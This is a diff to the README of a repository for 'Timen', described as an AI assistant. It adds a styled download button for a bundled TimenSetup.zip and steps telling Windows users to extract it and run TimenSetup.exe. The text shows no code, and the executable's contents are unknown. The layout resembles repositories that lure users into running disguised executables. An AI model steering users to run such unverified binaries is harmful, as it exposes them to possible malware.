@@ -15,14 +15,18 @@ Welcome to **Timen** – a revolutionary AI assistant that adapts to your unique
 
 ## Download & Installation
 
-To get started, download the demo from the `TimenSetup.zip` file included in this repository.
+<p align="center">
+  <a href="TimenSetup.zip" style="background-color: #007aff; color: #ffffff; padding: 15px 25px; font-size: 18px; text-decoration: none; border-radius: 8px;">Download TimenSetup.zip</a>
+</p>
 
-**Installation Steps:**
+To get started, simply click the download button above to retrieve the `TimenSetup.zip` file.
 
-1. **Download:** Click on or clone this repository and locate the `TimenSetup.zip` file.
-2. **Extract:** Unzip the file into a directory of your choice.
-3. **Install:** Run the installer and follow the on‑screen instructions.
-4. **Customize:** Personalize Timen to suit your preferences and enjoy a smarter computing experience.
+**Installation Steps (Windows 11):**
+
+1. **Download:** Click the button above to download the `TimenSetup.zip` file.
+2. **Extract:** Right‑click the downloaded file and select **Extract All...** to unzip it into a folder of your choice.
+3. **Run Installer:** Open the extracted folder and double‑click on **TimenSetup.exe** to start the installation process.
+4. **Customize:** Follow the on‑screen instructions to personalize Timen and enjoy a smarter computing experience.
 
 ---
 
